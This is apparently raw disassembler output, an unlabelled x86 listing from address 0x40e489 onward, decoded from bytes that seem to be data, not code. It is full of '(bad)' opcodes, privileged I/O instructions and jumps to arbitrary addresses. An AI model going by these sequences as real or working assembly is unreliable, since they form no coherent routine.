  40e489:	xor    BYTE PTR [esi+0x755e3ff5],0x2
  40e490:	jmp    0x6f52d613
  40e495:	ins    DWORD PTR es:[edi],dx
  40e496:	mov    ds:0x3503e83f,eax
  40e49b:	mov    ebx,0xeeff6ad3
  40e4a0:	loopne 0x40e520
  40e4a2:	lock pop esi
  40e4a4:	jecxz  0x40e4a9
  40e4a6:	jne    0x40e47a
  40e4a8:	jae    0x40e523
  40e4aa:	data16 add cl,ch
  40e4ad:	add    edi,esi
  40e4af:	aas    
  40e4b0:	inc    eax
  40e4b1:	sub    esp,ebx
  40e4b3:	add    ecx,ebp
  40e4b5:	xchg   BYTE PTR [edx],ah
  40e4b7:	clc    
  40e4b8:	imul   ebp,DWORD PTR [eax+0x791d6858],0xfffffff8
  40e4bf:	gs in  eax,dx
  40e4c1:	add    esi,DWORD PTR [ebp+0x79]
  40e4c4:	imul   edx,DWORD PTR [eax],0xb3e9026d
  40e4ca:	jne    0x40e493
  40e4cc:	sahf   
  40e4cd:	cmp    dh,BYTE PTR [edi+edi*8]
  40e4d0:	call   0x196d1a05
  40e4d5:	clc    
  40e4d6:	mov    edi,?
  40e4d8:	popf   
  40e4d9:	stc    
  40e4da:	nop
  40e4db:	sub    esi,DWORD PTR [ecx+0xf7]
  40e4e1:	add    BYTE PTR [eax],al
  40e4e3:	xchg   esp,eax
  40e4e4:	rcr    BYTE PTR [ecx],1
  40e4e6:	jbe    0x40e4df
  40e4e8:	imul   ebx,DWORD PTR [eax],0x7df767f7
  40e4ee:	mov    ecx,0xebbf8374
  40e4f3:	data16 std 
  40e4f5:	jmp    FWORD PTR [ecx+0x5f]
  40e4f8:	iret   
  40e4f9:	je     0x40e4df
  40e4fb:	mov    esp,0x46ea5803
  40e500:	aam    0xe
  40e502:	push   esi
  40e503:	int3   
  40e504:	jbe    0x40e55e
  40e506:	mov    ecx,0xe0fa84d0
  40e50b:	leave  
  40e50c:	inc    DWORD PTR [edx]
  40e50e:	jg     0x40e54b
  40e510:	repz lock cdq 
  40e513:	dec    ebp
  40e514:	pop    es
  40e515:	lea    edx,[eax]
  40e517:	fcomp  st(5)
  40e519:	xor    BYTE PTR [edx+0x7b],0xef
  40e51d:	pop    es
  40e51e:	jmp    0x5c4f:0x58737620
  40e525:	push   cs
  40e526:	fs mov edi,0xd6a6588
  40e52c:	(bad)  
  40e52d:	jbe    0x40e521
  40e52f:	jne    0x40e5a1
  40e531:	mov    WORD PTR [ebp+0x2b829ae7],?
  40e537:	je     0x40e594
  40e539:	(bad)  
  40e53a:	xchg   edx,eax
  40e53b:	pop    eax
  40e53c:	jle    0x40e506
  40e53e:	popf   
  40e53f:	jne    0x40e4c4
  40e541:	(bad)  
  40e542:	call   0x2a9f1616
  40e547:	add    BYTE PTR [eax],al
  40e549:	add    BYTE PTR [eax],al
  40e54b:	add    BYTE PTR [edi+edi*8],ch
  40e54e:	mov    dh,ah
  40e550:	cs inc esp
  40e552:	imul   esi,ebp,0xaa74871e
  40e558:	jbe    0x40e5b4
  40e55a:	fs dec ecx
  40e55c:	je     0x40e560
  40e55e:	xor    esi,edi
  40e560:	push   esp
  40e561:	in     eax,dx
  40e562:	sti    
  40e563:	jb     0x40e598
  40e565:	sub    eax,DWORD PTR [ebx]
  40e567:	stos   DWORD PTR es:[edi],eax
  40e568:	push   cs
  40e569:	mov    al,0x47
  40e56b:	std    
  40e56c:	lea    edi,[ebx-0x50000f00]
  40e572:	aas    
  40e573:	add    BYTE PTR [edx],cl
  40e575:	popa   
  40e576:	add    eax,0xffffffa8
  40e579:	pop    ds
  40e57a:	push   0x2
  40e57c:	and    DWORD PTR [ecx+edi*1-0x8],0xffffff9f
  40e581:	test   DWORD PTR [edx-0xe00cf8f],0xfde26989
  40e58b:	jno    0x40e511
  40e58d:	push   esp
  40e58e:	std    
  40e58f:	adc    eax,0x401070
  40e594:	dec    ecx
  40e595:	mov    esi,0xf0ef0572
  40e59a:	xchg   DWORD PTR [ebp-0x8],esi
  40e59d:	jle    0x40e5ea
  40e59f:	cld    
  40e5a0:	adc    esp,edi
  40e5a2:	(bad)  
  40e5a3:	jmp    0x40e546
  40e5a5:	das    
  40e5a6:	rol    BYTE PTR [eax+0x5f],0xe7
  40e5aa:	arpl   ax,bp
  40e5ac:	pop    ds
  40e5ad:	test   eax,0xfffa
  40e5b2:	add    BYTE PTR [eax],al
  40e5b4:	add    BYTE PTR [edi-0x42],bl
  40e5b7:	out    0x48,al
  40e5b9:	in     al,dx
  40e5ba:	(bad)  
  40e5bb:	inc    edx
  40e5bd:	inc    esi
  40e5be:	adc    ch,BYTE PTR [eax-0x70]
  40e5c1:	sub    DWORD PTR ds:0xa24ce7fe,edi
  40e5c7:	add    BYTE PTR [eax],al
  40e5c9:	out    0x43,eax
  40e5cb:	push   cs
  40e5cc:	mov    ebp,DWORD PTR [esi-0x1b]
  40e5cf:	jnp    0x40e5d9
  40e5d1:	fbld   TBYTE PTR [ebx-0x6]
  40e5d4:	add    bh,dl
  40e5d6:	dec    edi
  40e5d7:	cmp    al,BYTE PTR [ebx+0xa264b0]
  40e5dd:	sbb    al,0x2
  40e5df:	add    BYTE PTR [edi],cl
  40e5e1:	cwde   
  40e5e2:	js     0x40e5e2
  40e5e4:	dec    DWORD PTR [eiz*8+0x1ec0a9a]
  40e5eb:	add    BYTE PTR [eax],al
  40e5ed:	test   DWORD PTR [edx],edi
  40e5ef:	push   cs
  40e5f0:	test   DWORD PTR [ebp-0x50],esi
  40e5f3:	stc    
  40e5f4:	xor    ecx,0x5b
  40e5f7:	add    al,BYTE PTR [eax]
  40e5f9:	out    dx,al
  40e5fa:	push   ds
  40e5fb:	clc    
  40e5fc:	add    cl,ah
  40e5fe:	repnz mov DWORD PTR [edi],0xf7034ff8
  40e605:	mov    ebp,0xb6224250
  40e60a:	lock into 
  40e60c:	or     DWORD PTR [ecx-0x30d58bb0],ecx
  40e612:	loop   0x40e5fb
  40e614:	or     ebp,esi
  40e616:	push   ss
  40e617:	adc    al,0x3
  40e619:	add    BYTE PTR [eax],al
  40e61b:	add    BYTE PTR [eax],al
  40e61d:	add    BYTE PTR [edx+esi*8+0x40f6dfc7],bl
  40e624:	add    dh,BYTE PTR [ecx+eax*2-0x20]
  40e628:	aad    0x3
  40e62a:	div    cl
  40e62c:	cli    
  40e62d:	jno    0x40e661
  40e62f:	out    dx,al
  40e630:	in     al,dx
  40e631:	mul    DWORD PTR [esp+esi*4-0x279a8385]
  40e638:	(bad)  
  40e63a:	jne    0x40e61c
  40e63c:	iret   
  40e63d:	jecxz  0x40e67d
  40e63f:	add    al,0xf6
  40e641:	xor    eax,DWORD PTR [edx+0x7d52ceec]
  40e647:	xor    eax,0xfee9d17f
  40e64c:	test   cl,ah
  40e64e:	pop    edx
  40e64f:	ins    BYTE PTR es:[edi],dx
  40e650:	add    al,BYTE PTR [eax]
  40e652:	jbe    0x40e6bc
  40e654:	add    eax,0xfaa68ed1
  40e659:	jno    0x40e6c6
  40e65b:	fiadd  WORD PTR [edx+0x73]
  40e65e:	jno    0x40e6a0
  40e660:	push   edx
  40e661:	jbe    0x40e5e6
  40e663:	lock out 0xb,eax
  40e666:	pop    esp
  40e667:	mov    cl,0x7d
  40e669:	cmp    DWORD PTR [esi+0x55],esi
  40e66c:	jp     0x40e6a7
  40e66e:	out    dx,al
  40e66f:	add    DWORD PTR [esp+edx*1+0x12],esp
  40e673:	mov    edi,0x1315dc4
  40e678:	xor    al,BYTE PTR [eax]
  40e67a:	push   cs
  40e67b:	sahf   
  40e67c:	imul   esi,DWORD PTR [edi+0x37864fe],0x0
  40e686:	add    dh,bl
  40e688:	idiv   cl
  40e68a:	inc    ebx
  40e68b:	stos   BYTE PTR es:[edi],al
  40e68c:	inc    ecx
  40e68d:	popa   
  40e68e:	(bad)  
  40e690:	sbb    BYTE PTR [ebx],0x68
  40e693:	fld    TBYTE PTR [edi]
  40e695:	test   eax,0xea85495c
  40e69a:	add    esi,DWORD PTR [edi+0x66dde8f5]
  40e6a0:	fisubr DWORD PTR [eax-0x6efdc811]
  40e6a6:	sbb    eax,0x7ce90012
  40e6ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6ac:	xor    BYTE PTR [edx+0x6166417b],dl
  40e6b2:	ret    0x795e
  40e6b5:	in     al,0x33
  40e6b7:	and    eax,0x1c60bb7a
  40e6bc:	ret    0x3c0
  40e6bf:	inc    ebp
  40e6c0:	add    ch,cl
  40e6c2:	shl    BYTE PTR [edi],1
  40e6c4:	gs mov ebx,0xb50e73fb
  40e6ca:	adc    eax,0xbf6002b5
  40e6cf:	inc    edx
  40e6d0:	sub    BYTE PTR [edx],ch
  40e6d2:	lock mov edi,0x5b5bbecb
  40e6d8:	cwde   
  40e6d9:	out    0x3,eax
  40e6db:	(bad)  
  40e6dc:	cmp    bl,BYTE PTR [edi-0x49]
  40e6df:	push   ds
  40e6e0:	sub    BYTE PTR [edx],ah
  40e6e2:	lock test edi,ecx
  40e6e5:	cdq    
  40e6e6:	sar    edi,1
  40e6e8:	int    0x8
  40e6ea:	pop    esp
  40e6eb:	add    BYTE PTR [eax],al
  40e6ed:	add    BYTE PTR [eax],al
  40e6ef:	add    BYTE PTR [ebp+eiz*2-0x1],cl
  40e6f3:	cmc    
  40e6f4:	lea    edi,[edi-0x41]
  40e6f7:	jne    0x40e761
  40e6f9:	iret   
  40e6fa:	push   esi
  40e6fb:	out    0x23,al
  40e6fd:	dec    eax
  40e6fe:	(bad)  
  40e6ff:	push   esp
  40e700:	xchg   ecx,eax
  40e701:	fs je  0x40e6e5
  40e704:	lea    ecx,[esi]
  40e706:	ins    BYTE PTR es:[edi],dx
  40e707:	sti    
  40e708:	ss fs cmc 
  40e70b:	mov    eax,ds:0xa1f64281
  40e710:	outs   dx,BYTE PTR ds:[esi]
  40e711:	mov    esi,0x47d3b6e6
  40e716:	out    0xee,eax
  40e718:	stc    
  40e719:	add    al,BYTE PTR [eax]
  40e71b:	loope  0x40e6d8
  40e71d:	pop    esp
  40e71e:	je     0x40e714
  40e720:	scas   al,BYTE PTR es:[edi]
  40e721:	arpl   WORD PTR [esi-0x17],di
  40e724:	jbe    0x40e6f5
  40e726:	(bad)  
  40e727:	adc    al,0x51
  40e729:	fs je  0x40e71d
  40e72c:	sbb    eax,0xb6db780e
  40e731:	arpl   WORD PTR [edi+0x4c801914],ax
  40e737:	ins    DWORD PTR es:[edi],dx
  40e738:	or     eax,0x31494478
  40e73d:	div    BYTE PTR [edx]
  40e73f:	sub    DWORD PTR [esi+0x1ecc8a40],esi
  40e745:	or     BYTE PTR [ebp+ecx*2+0xd],0x30
  40e74a:	rcl    BYTE PTR [ecx-0x4c],0x85
  40e74e:	add    ecx,ebp
  40e750:	mov    al,0xff
  40e752:	inc    edx
  40e754:	add    BYTE PTR [eax],al
  40e756:	add    BYTE PTR [eax],al
  40e758:	add    BYTE PTR [esi-0x26],ch
  40e75b:	jg     0x40e711
  40e75d:	xor    DWORD PTR [ebx-0x1a],esp
  40e760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e761:	cld    
  40e762:	add    BYTE PTR [eax],al
  40e764:	jb     0x40e745
  40e766:	and    BYTE PTR [ebp+edx*1+0x76],0x77
  40e76b:	inc    esi
  40e76c:	int    0x71
  40e76e:	cmp    eax,DWORD PTR [edx-0x76807c00]
  40e774:	xor    BYTE PTR [ecx-0x709e8d0f],dl
  40e77a:	push   edi
  40e77b:	add    dl,BYTE PTR [edx+eiz*4]
  40e77e:	ss add edi,esi
  40e781:	test   DWORD PTR [ecx-0x2a],esi
  40e784:	sub    DWORD PTR [edx-0x2],0x73
  40e788:	push   ecx
  40e789:	xchg   edi,eax
  40e78a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e78b:	or     al,BYTE PTR [ebx]
  40e78d:	ror    DWORD PTR [ebp-0x3],cl
  40e790:	push   ebp
  40e791:	in     al,0xe5
  40e793:	inc    ebx
  40e794:	loopne 0x40e7e7
  40e796:	mov    esi,0xfc575072
  40e79b:	add    bl,bh
  40e79d:	push   edi
  40e79e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e79f:	push   cs
  40e7a0:	add    esp,DWORD PTR [ebx]
  40e7a2:	in     eax,0x43
  40e7a4:	in     al,0x45
  40e7a6:	cmp    edx,ebx
  40e7a8:	mov    ecx,edi
  40e7aa:	cmp    DWORD PTR [esi+0x555b374],0xfedafb25
  40e7b4:	inc    DWORD PTR [edi]
  40e7b6:	add    DWORD PTR [ebx],eax
  40e7b8:	(bad)  
  40e7b9:	movsx  eax,BYTE PTR [eax]
  40e7bc:	push   eax
  40e7bd:	add    BYTE PTR [eax],al
  40e7bf:	add    BYTE PTR [eax],al
  40e7c1:	add    BYTE PTR [ebx],cl
  40e7c3:	jno    0x40e7a3
  40e7c5:	call   ecx
  40e7c7:	push   0xffffff83
  40e7c9:	shl    BYTE PTR [eax+0x304d8b20],0xe5
  40e7d0:	inc    DWORD PTR [edx+0x4583024f]
  40e7d6:	rol    BYTE PTR [edx],0xeb
  40e7d9:	rcr    bh,1
  40e7db:	and    BYTE PTR [ebx],dl
  40e7dd:	jmp    0x40e7d2
  40e7df:	test   DWORD PTR [ebx-0x4],ecx
  40e7e2:	mov    edx,DWORD PTR [esi+0x1549eaff]
  40e7e8:	rol    BYTE PTR [eax-0x61],0xdd
  40e7ec:	arpl   ax,bp
  40e7ee:	jne    0x40e7dc
  40e7f0:	mov    eax,0x423e3afb
  40e7f5:	out    0x5d,eax
  40e7f7:	jmp    0x5477e7fd
  40e7fc:	add    ch,BYTE PTR [edx+0x7d]
  40e7ff:	xor    edx,0x74
  40e802:	mov    dh,0x6b
  40e804:	pop    edx
  40e805:	(bad)  
  40e807:	ins    DWORD PTR es:[edi],dx
  40e808:	add    dh,BYTE PTR [ebx]
  40e80a:	cs aam 0xc7
  40e80d:	out    0xec,al
  40e80f:	push   ss
  40e810:	push   0x7b0fb48a
  40e815:	xchg   ebx,eax
  40e816:	jge    0x40e803
  40e818:	add    al,BYTE PTR [eax]
  40e81a:	jne    0x40e820
  40e81c:	push   ebx
  40e81d:	jne    0x40e864
  40e81f:	in     al,dx
  40e820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e821:	pop    es
  40e822:	icebp  
  40e823:	imul   eax,DWORD PTR [edx],0x0
  40e826:	add    BYTE PTR [eax],al
  40e828:	add    BYTE PTR [eax],al
  40e82a:	add    BYTE PTR [ecx+0x1],ch
  40e82d:	mov    esi,0x7b55818c
  40e832:	je     0x40e7d1
  40e834:	in     al,0xfc
  40e836:	cmp    dh,BYTE PTR [esi+0x718d29f7]
  40e83c:	push   ebx
  40e83d:	jns    0x40e884
  40e83f:	test   DWORD PTR [ebx+eax*2-0x78],ebp
  40e843:	cmp    BYTE PTR [edi+0x7b],dh
  40e846:	jl     0x40e7dd
  40e848:	xchg   edx,eax
  40e849:	add    eax,0xcfd46d74
  40e84e:	pop    es
  40e84f:	dec    esi
  40e850:	pop    ebx
  40e851:	out    dx,eax
  40e852:	or     dh,ch
  40e854:	sahf   
  40e855:	test   BYTE PTR [eax-0x193fd69b],0x74
  40e85c:	in     al,dx
  40e85d:	cmp    eax,0xff2af603
  40e862:	jmp    0x234e:0x133cec43
  40e869:	xor    al,al
  40e86b:	mov    ch,0x2
  40e86d:	sub    bh,BYTE PTR [edx-0x2f]
  40e870:	push   0x26
  40e872:	rcr    BYTE PTR [ebx+0x2],0x6a
  40e876:	mov    eax,0xc062613e
  40e87b:	sbb    ebp,DWORD PTR [edx+0x4d]
  40e87e:	mov    BYTE PTR [edx+eax*1+0x2b],dh
  40e882:	sti    
  40e883:	and    dh,BYTE PTR [edi+0xa56ef61]
  40e889:	xchg   esi,eax
  40e88a:	jp     0x40e898
  40e88c:	lea    edi,[eax]
  40e88e:	clc    
  40e88f:	add    BYTE PTR [eax],al
  40e891:	add    BYTE PTR [eax],al
  40e893:	add    bh,bh
  40e895:	cmc    
  40e896:	call   0xef71:0xe9ea9279
  40e89d:	mov    cl,0x3c
  40e89f:	sbb    esp,eax
  40e8a1:	sbb    al,0xc3
  40e8a3:	out    0x76,al
  40e8a5:	adc    eax,0x588c59a9
  40e8aa:	sub    al,0x20
  40e8ac:	test   DWORD PTR [ebx],eax
  40e8ae:	sbb    dh,al
  40e8b0:	test   BYTE PTR [edi-0x7293195b],al
  40e8b6:	sub    BYTE PTR [esi+ecx*4],dh
  40e8b9:	push   ebx
  40e8ba:	in     eax,0xad
  40e8bc:	pop    ebp
  40e8bd:	adc    DWORD PTR [edi+0x10],edx
  40e8c0:	or     DWORD PTR [esp+eiz*8-0x3f3cc600],0x7
  40e8c8:	ja     0x40e8a1
  40e8ca:	(bad)  
  40e8cb:	jle    0x40e868
  40e8cd:	loopne 0x40e850
  40e8cf:	xor    DWORD PTR [ebp+0x28c4c1c1],esi
  40e8d5:	inc    esp
  40e8d6:	lock add ebp,edi
  40e8d9:	repnz (bad) 
  40e8db:	(bad)  
  40e8dc:	sub    eax,ebx
  40e8de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8df:	sub    DWORD PTR [edi],esi
  40e8e1:	(bad)  
  40e8e2:	out    dx,al
  40e8e3:	jle    0x40e950
  40e8e5:	loopne 0x40e91e
  40e8e7:	pop    ecx
  40e8e8:	pop    eax
  40e8e9:	adc    al,0x0
  40e8eb:	sub    DWORD PTR [esi+eiz*2-0x7d529dac],edi
  40e8f2:	jmp    0x40e8f1
  40e8f4:	ja     0x40e8f8
  40e8f6:	add    BYTE PTR [edx+0x0],bh
  40e8fc:	add    BYTE PTR [eax],dh
  40e8fe:	lea    esi,[ebp+edi*8+0x29]
  40e902:	(bad)  
  40e903:	stc    
  40e904:	bound  edi,QWORD PTR [esi+0x76e62b6a]
  40e90a:	add    cl,BYTE PTR [ebx+0x461b82a4]
  40e910:	loope  0x40e933
  40e912:	test   DWORD PTR [ebx],esi
  40e914:	into   
  40e915:	jbe    0x40e919
  40e917:	imul   BYTE PTR [ecx+edx*2]
  40e91a:	add    al,0x8b
  40e91c:	and    al,0x71
  40e91e:	mov    DWORD PTR [ecx+eax*8+0xa],eax
  40e922:	adc    DWORD PTR [ebx+0x44897d24],ecx
  40e928:	mov    cl,0x63
  40e92a:	mov    bh,0x70
  40e92d:	mov    ebx,0x6d2c884b
  40e932:	mov    WORD PTR [esi],cs
  40e934:	push   0xffffffb3
  40e936:	outs   dx,DWORD PTR ds:[esi]
  40e937:	jmp    FWORD PTR [ecx-0x55]
  40e93a:	imul   edi,edi,0xffffffed
  40e93d:	adc    BYTE PTR [ebx-0x78],al
  40e940:	sub    al,0x4d
  40e942:	test   bh,dh
  40e944:	pop    ss
  40e945:	test   al,0x88
  40e947:	lods   al,BYTE PTR ds:[esi]
  40e948:	shl    BYTE PTR [esi+0x2],1
  40e94b:	getsec 
  40e94d:	push   es
  40e94e:	lods   eax,DWORD PTR ds:[esi]
  40e94f:	add    DWORD PTR [eax],ebp
  40e951:	jno    0x40e9b2
  40e953:	and    edx,DWORD PTR [ebp+esi*8+0x2]
  40e957:	inc    ecx
  40e958:	jmp    0xe8877ede
  40e95d:	mov    DWORD PTR [ebp+0xeb4e],edx
  40e963:	add    BYTE PTR [eax],al
  40e965:	add    BYTE PTR [edi],dh
  40e967:	aas    
  40e968:	pop    es
  40e969:	loop   0x40e922
  40e96b:	fistp  QWORD PTR [esi+0x0]
  40e96e:	pop    edi
  40e96f:	xor    al,BYTE PTR [edi-0x7ca9b7bb]
  40e975:	xchg   ebp,eax
  40e976:	dec    esp
  40e977:	add    eax,DWORD PTR [eax]
  40e979:	and    DWORD PTR [ecx+0x13],0xffffffe5
  40e97d:	inc    ebx
  40e97e:	pop    esp
  40e97f:	add    ecx,DWORD PTR [edi]
  40e981:	test   cl,bl
  40e983:	add    eax,DWORD PTR [eax]
  40e985:	add    BYTE PTR [ebx-0x53],dl
  40e988:	inc    ebp
  40e989:	add    al,0x97
  40e98b:	xchg   ebp,eax
  40e98c:	push   0xffffff89
  40e98e:	fld    DWORD PTR [esi-0x23efb977]
  40e994:	inc    ebx
  40e995:	mov    al,ds:0x2b669d97
  40e99a:	push   esp
  40e99b:	fmul   QWORD PTR [ebx-0x58]
  40e99e:	xchg   DWORD PTR [ecx],esi
  40e9a0:	push   es
  40e9a1:	sub    eax,esp
  40e9a3:	mov    WORD PTR [ebx-0x5c],es
  40e9a6:	xchg   ebp,eax
  40e9a7:	xor    DWORD PTR [edx-0x37d0e875],ebp
  40e9ad:	punpckhdq mm1,QWORD PTR [ebx+0x3]
  40e9b1:	shr    DWORD PTR [ebp+ecx*1-0xca3b277],0xb5
  40e9b9:	dec    edi
  40e9ba:	fimul  DWORD PTR [edi]
  40e9bc:	ror    DWORD PTR [edi],0x2a
  40e9bf:	xor    eax,DWORD PTR [esi]
  40e9c1:	mov    DWORD PTR [ecx-0x7449f23a],ebx
  40e9c7:	or     eax,ecx
  40e9c9:	loopne 0x40e9cb
  40e9cb:	add    BYTE PTR [eax],al
  40e9cd:	add    BYTE PTR [eax],al
  40e9cf:	xchg   esp,eax
  40e9d0:	xadd   DWORD PTR [ecx+0x4589ca59],ecx
  40e9d7:	mov    esp,0xfdc229dd
  40e9dc:	mov    ebp,0x8f484587
  40e9e1:	test   BYTE PTR [esp+ebx*4-0x2676fffe],al
  40e9e8:	jp     0x40e973
  40e9ea:	xchg   BYTE PTR [ebp-0x2f],dh
  40e9ed:	add    eax,DWORD PTR [eax]
  40e9ef:	jne    0x40e9af
  40e9f1:	rcl    BYTE PTR [edi+0x7aaf32],1
  40e9f7:	jne    0x40ea64
  40e9f9:	add    cl,BYTE PTR [ecx+0x1462d7b0]
  40e9ff:	test   esi,eax
  40ea01:	(bad)  
  40ea02:	push   ecx
  40ea04:	sub    edx,DWORD PTR [ebx]
  40ea06:	(bad)  
  40ea07:	loopne 0x40ea5a
  40ea09:	add    al,BYTE PTR [eax]
  40ea0b:	push   0xffffffe3
  40ea0d:	pop    ecx
  40ea0e:	daa    
  40ea0f:	jne    0x40ea7c
  40ea11:	test   esi,eax
  40ea13:	jae    0x40e9eb
  40ea15:	mov    edx,0xe157202
  40ea1a:	mov    DWORD PTR [eax-0x64077aa5],ebp
  40ea20:	cmp    al,0x86
  40ea22:	call   0x8343559b
  40ea27:	cld    
  40ea28:	les    edx,FWORD PTR [edx]
  40ea2a:	test   BYTE PTR ds:0xf600026b,dl
  40ea30:	xor    ah,dh
  40ea32:	jae    0x40ea34
  40ea34:	add    BYTE PTR [eax],al
  40ea36:	add    BYTE PTR [eax],al
  40ea38:	dec    esi
  40ea39:	call   0xf5aa4e99
  40ea3e:	xchg   al,bh
  40ea40:	dec    ebp
  40ea41:	push   ds
  40ea42:	clc    
  40ea43:	push   cs
  40ea44:	or     esp,DWORD PTR ds:0x15030f05
  40ea4a:	push   es
  40ea4b:	rcl    ebp,0x53
  40ea4e:	or     eax,0x6b7376c1
  40ea53:	xor    DWORD PTR [ebx+ebp*2+0x2],0xc24f308b
  40ea5b:	dec    edi
  40ea5c:	punpckhdq mm5,mm4
  40ea5f:	call   FWORD PTR [ebx-0x417505a2]
  40ea65:	cmc    
  40ea66:	bound  esi,QWORD PTR [ebp+eiz*2+0x2]
  40ea6a:	data16 fsubr DWORD PTR [esi+0x5d]
  40ea6e:	ror    DWORD PTR [ebx],cl
  40ea70:	lea    esi,[edx+0x56]
  40ea73:	bound  esi,QWORD PTR [ebx-0x7f]
  40ea76:	push   eax
  40ea77:	add    al,0x7a
  40ea79:	xchg   BYTE PTR [esi+0x635d62ff],cl
  40ea7f:	inc    ebx
  40ea80:	out    0x9,al
  40ea82:	hlt    
  40ea83:	add    DWORD PTR [ecx+0x5d],edx
  40ea86:	sub    eax,0xd081f012
  40ea8b:	add    esi,DWORD PTR [ebp+0x1]
  40ea8e:	pushf  
  40ea8f:	test   DWORD PTR [ebp-0x39],0xd7503e7
  40ea96:	push   edi
  40ea97:	retf   0xd76
  40ea9a:	aas    
  40ea9b:	mov    edx,0x0
  40eaa0:	add    BYTE PTR [ecx+0x43],bh
  40eaa3:	or     BYTE PTR [ebx],cl
  40eaa5:	outs   dx,BYTE PTR ds:[esi]
  40eaa6:	inc    eax
  40eaa7:	jmp    0xd90839ef
  40eaac:	loopne 0x40eb27
  40eaae:	mov    DWORD PTR [esi],edi
  40eab0:	adc    dh,dh
  40eab2:	sbb    eax,0x8f6a046b
  40eab7:	jne    0x40eabf
  40eab9:	jne    0x40eabd
  40eabb:	push   0xffffffe7
  40eabd:	out    0x1,al
  40eabf:	push   0x5b
  40eac1:	pop    ecx
  40eac2:	or     eax,0x2740664
  40eac7:	jmp    0x6a6b2b58
  40eacc:	out    0x66,eax
  40eace:	add    bh,BYTE PTR [eax-0x372408a4]
  40ead4:	add    ebp,esp
  40ead6:	(bad)  
  40ead7:	cwde   
  40ead8:	mov    eax,DWORD PTR [ecx+0x6e]
  40eadb:	push   cs
  40eadc:	es jp  0x40ea73
  40eadf:	out    0x10,eax
  40eae1:	jmp    0x40ea95
  40eae3:	out    0x42,eax
  40eae5:	mov    edx,0x38e20009
  40eaea:	sbb    BYTE PTR [ebp+0x79],al
  40eaed:	lods   eax,DWORD PTR ds:[esi]
  40eaee:	icebp  
  40eaef:	add    dh,BYTE PTR [edi-0xabba2a6]
  40eaf5:	jmp    0x42a0febf
  40eafa:	push   0xde96a73a
  40eaff:	fnsave [edx+0x3a]
  40eb02:	lock cmp ah,BYTE PTR [edi+0x0]
  40eb09:	add    BYTE PTR [esi+0x79768d0b],dl
  40eb0f:	add    al,BYTE PTR [eax]
  40eb11:	bound  esi,QWORD PTR [edx]
  40eb13:	push   0x18a6ac88
  40eb18:	inc    esi
  40eb19:	rcr    DWORD PTR [eax+ecx*8],1
  40eb1c:	mov    ch,BYTE PTR [esi+eax*8-0x3ab9d8]
  40eb23:	(bad)  
  40eb24:	out    dx,eax
  40eb25:	push   0xffffffb9
  40eb27:	add    DWORD PTR [eax+0x72],edx
  40eb2a:	xor    ch,BYTE PTR [eax-0x7e]
  40eb2d:	sub    DWORD PTR [ebx-0x4e],edi
  40eb30:	(bad)  
  40eb31:	aam    0x12
  40eb33:	idiv   BYTE PTR [edi]
  40eb35:	jmp    0xa9c5a5f9
  40eb3a:	and    ebp,DWORD PTR [eax]
  40eb3c:	mov    esp,DWORD PTR [ecx+ecx*2]
  40eb3f:	or     al,0xb6
  40eb41:	call   0xe8917fcb
  40eb46:	aaa    
  40eb47:	cmp    eax,DWORD PTR [edi]
  40eb49:	repnz xor BYTE PTR [eax],al
  40eb4c:	shl    dl,0xbb
  40eb4f:	or     edi,DWORD PTR [ebp-0x24]
  40eb52:	stc    
  40eb53:	mov    ch,0xb
  40eb55:	push   0x62
  40eb57:	cmp    bh,0xed
  40eb5a:	jmp    0x40eb5e
  40eb5c:	add    ch,cl
  40eb5e:	jbe    0x40ebdf
  40eb60:	fs xchg ebp,eax
  40eb62:	jbe    0x40eb7b
  40eb64:	dec    esi
  40eb65:	add    ah,al
  40eb67:	cmp    dh,BYTE PTR [edx-0x22dae75]
  40eb6d:	inc    ebp
  40eb6e:	add    BYTE PTR [eax],al
  40eb70:	add    BYTE PTR [eax],al
  40eb72:	add    BYTE PTR [eax+0x17f04388],dh
  40eb78:	inc    esp
  40eb79:	adc    bh,BYTE PTR [ebx]
  40eb7b:	rcr    BYTE PTR [edi],cl
  40eb7d:	jge    0x40ebd6
  40eb7f:	pop    es
  40eb80:	inc    esp
  40eb81:	jmp    0xa845:0x89059c83
  40eb88:	mov    es,WORD PTR [ebx-0x10]
  40eb8b:	dec    edi
  40eb8c:	dec    ecx
  40eb8d:	and    cl,BYTE PTR [ecx-0x3f7e50ef]
  40eb93:	pop    esi
  40eb94:	(bad)  
  40eb95:	std    
  40eb96:	jne    0x40eb20
  40eb98:	loop   0x40ebad
  40eb9a:	fs inc edx
  40eb9c:	aas    
  40eb9d:	(bad)  
  40eb9e:	pop    eax
  40eb9f:	xor    eax,0x4e75be84
  40eba4:	mov    cs,WORD PTR [ebx-0x10]
  40eba7:	dec    ebx
  40eba8:	jns    0x40eba9
  40ebaa:	push   cs
  40ebab:	bound  ecx,QWORD PTR [eax-0x1]
  40ebae:	shr    BYTE PTR [edi+eax*1+0xb],0xc1
  40ebb3:	pop    ds
  40ebb4:	mov    edi,0x3c2c4539
  40ebb9:	or     ecx,DWORD PTR [ebx+0x3c82f24a]
  40ebbf:	lea    eax,[esi]
  40ebc1:	jge    0x40f132
  40ebc7:	pop    edi
  40ebc8:	imul   esi,edx,0x1248bb00
  40ebce:	mov    edx,DWORD PTR [ecx+0x7c46395a]
  40ebd4:	bound  esi,QWORD PTR [eax+0xf]
  40ebda:	add    BYTE PTR [eax],al
  40ebdc:	inc    edx
  40ebdd:	inc    ebx
  40ebde:	dec    DWORD PTR [esi]
  40ebe0:	and    cl,BYTE PTR [ebx+0x0]
  40ebe3:	shr    esp,0xd
  40ebe6:	or     eax,ecx
  40ebe8:	jne    0x40ec52
  40ebea:	pop    edx
  40ebeb:	sub    BYTE PTR [eax],0x75
  40ebee:	add    esi,DWORD PTR [ebp+0x6c]
  40ebf1:	jmp    0xe6ab4014
  40ebf6:	mov    ecx,0x81697502
  40ebfb:	(bad)  
  40ebfc:	jbe    0x40ebe6
  40ebfe:	loopne 0x40ebfb
  40ec00:	push   ss
  40ec01:	push   esp
  40ec02:	xchg   DWORD PTR [ecx+ebx*2+0x69],edx
  40ec06:	add    cl,BYTE PTR [ebx+0x4fc407b8]
  40ec0c:	fild   QWORD PTR [ebp+0x5d]
  40ec0f:	je     0x40eb92
  40ec11:	aam    0x36
  40ec13:	(bad)  
